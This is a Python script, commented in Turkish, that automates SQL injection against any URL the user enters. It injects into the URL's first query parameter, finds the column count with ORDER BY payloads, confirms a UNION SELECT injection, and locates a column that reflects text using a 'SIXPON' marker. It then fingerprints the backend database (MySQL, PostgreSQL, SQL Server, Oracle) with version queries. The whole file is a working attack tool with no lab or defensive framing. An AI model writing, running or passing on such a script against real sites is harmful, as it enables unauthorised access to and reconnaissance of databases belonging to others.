import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

headers = {
    "User-Agent": "Mozilla/5.0"
}

url = input("Target URL: ")

if not url.startswith("http"):
    url = "https://" + url

parsed = urlparse(url)
params = parse_qs(parsed.query)

param_name = list(params.keys())[0]
param_value = params[param_name][0]

print("\n[+] Parametre:", param_name)
print("[+] Orijinal değer:", param_value)

# -------------------
# Kolon sayısı bulma
# -------------------

print("\n[+] Kolon sayısı aranıyor...\n")

column_count = 0

for i in range(1,10):

    payload = f"{param_value}' ORDER BY {i}-- -"

    params[param_name] = payload

    new_query = urlencode(params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    r = requests.get(new_url, headers=headers)

    print(f"{i} kolon denendi -> status {r.status_code}")

    if r.status_code != 200:
        column_count = i-1
        break

print(f"\n[+] Kolon sayısı: {column_count}")

# -------------------
# UNION testi
# -------------------

print("\n[+] UNION testi başlıyor...\n")

nulls = ",".join(["NULL"]*column_count)

payload = f"{param_value}' UNION SELECT {nulls}-- -"

params[param_name] = payload

new_query = urlencode(params, doseq=True)
new_url = urlunparse(parsed._replace(query=new_query))

r = requests.get(new_url, headers=headers)

print("UNION status:", r.status_code)

# -------------------
# Text yazılabilen kolon
# -------------------

print("\n[+] Text basılabilen kolon aranıyor...\n")

text_column = None

for i in range(column_count):

    cols = ["NULL"]*column_count
    cols[i] = "'SIXPON'"

    payload_cols = ",".join(cols)

    payload = f"{param_value}' UNION SELECT {payload_cols}-- -"

    params[param_name] = payload

    new_query = urlencode(params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    r = requests.get(new_url, headers=headers)

    if "SIXPON" in r.text:
        print(f"[+] Text yazılabilen kolon: {i+1}")
        text_column = i

# -------------------
# Database detection
# -------------------

print("\n[+] Database version deneniyor...\n")

db_payloads = {
    "MySQL / MariaDB": "@@version",
    "PostgreSQL": "version()",
    "Microsoft SQL Server": "@@version",
    "Oracle": "banner FROM v$version"
}

for db_name, version_query in db_payloads.items():

    cols = ["NULL"] * column_count

    if text_column is not None:
        cols[text_column] = version_query
    else:
        cols[0] = version_query

    payload_cols = ",".join(cols)

    payload = f"{param_value}' UNION SELECT {payload_cols}-- -"

    params[param_name] = payload

    new_query = urlencode(params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    r = requests.get(new_url, headers=headers)

    if "MariaDB" in r.text or "MySQL" in r.text:
        print("[+] Database: MySQL / MariaDB")
        break

    elif "PostgreSQL" in r.text:
        print("[+] Database: PostgreSQL")
        break

    elif "Microsoft SQL Server" in r.text:
        print("[+] Database: Microsoft SQL Server")
        break

    elif "Oracle" in r.text:
        print("[+] Database: Oracle")
        break
